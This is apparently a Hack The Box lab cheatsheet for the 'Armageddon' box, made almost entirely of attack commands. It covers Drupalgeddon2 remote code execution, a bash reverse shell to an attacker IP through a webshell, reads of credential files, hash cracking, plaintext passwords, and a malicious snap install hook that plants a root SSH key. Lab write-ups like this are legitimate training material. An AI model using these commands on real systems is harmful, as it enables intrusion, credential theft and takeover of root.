# HTB: Armageddon — Command Cheatsheet

## 📉 Box Info
- **Name:** Armageddon
- **IP:** 10.10.10.233
- **OS:** Linux (CentOS)
- **Difficulty:** Easy

---

## 🔍 Recon
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.233
nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.233
```

---

## 🏠 Web Enum (Drupal 7.56)
```bash
curl http://10.10.10.233/robots.txt
curl http://10.10.10.233/CHANGELOG.txt | head
```

---

## ⚡ Exploitation - Drupalgeddon2 (RCE)
```bash
git clone https://github.com/dreadlocked/Drupalgeddon2.git
cd Drupalgeddon2
./drupalgeddon2.rb http://10.10.10.233
```

### 🤖 Webshell Reverse Shell
```bash
# Listener
nc -lnvp 443

# Exploit (via webshell)
curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.7/443 0>&1" http://10.10.10.233/shell.php
```

---

## 🔍 Enumeration (as apache)
```bash
ls -l /home
cat /etc/passwd | grep bash
cat /var/www/html/sites/default/settings.php
```

### 📂 DB Access
```bash
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
select * from users;
```

---

## 🔐 Crack Hash
```bash
echo "$S$DgL2gj..." > drupal.hash
hashcat -m 7900 drupal.hash /usr/share/wordlists/rockyou.txt
```

---

## 🔒 SSH as brucetherealadmin
```bash
ssh brucetherealadmin@10.10.10.233
# password: booboo
```

---

## ⬆️ Privilege Escalation via snap
### ☑ Check sudo perms
```bash
sudo -l
```

### 🚀 Build Malicious Snap (on your own VM)
```bash
snapcraft init
mkdir -p snap/hooks
cat > snap/hooks/install << EOF
#!/bin/bash
mkdir -p /root/.ssh
echo "<your-public-key>" > /root/.ssh/authorized_keys
EOF
chmod +x snap/hooks/install

cat > snap/snapcraft.yaml << EOF
name: armageddon
version: '0.1'
summary: Exploit Snap
confinement: devmode
grade: devel
parts:
  dummy:
    plugin: nil
EOF

snapcraft
```

### 🛫 Transfer + Install on Target
```bash
# Host
sudo python3 -m http.server 80

# Target (as brucetherealadmin)
curl http://10.10.14.7/armageddon_0.1_amd64.snap -o shell.snap
sudo snap install shell.snap --devmode --dangerous
```

---

## ✅ Root Access (via SSH key installed)
```bash
ssh -i ~/.ssh/id_ed25519 root@10.10.10.233
cat /root/root.txt
```

---

## 📋 Notes & References
- Drupal RCE: [Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)
- Snap Exploitation: GTFOBins + Custom install hook
- DB Creds from: `/var/www/html/sites/default/settings.php`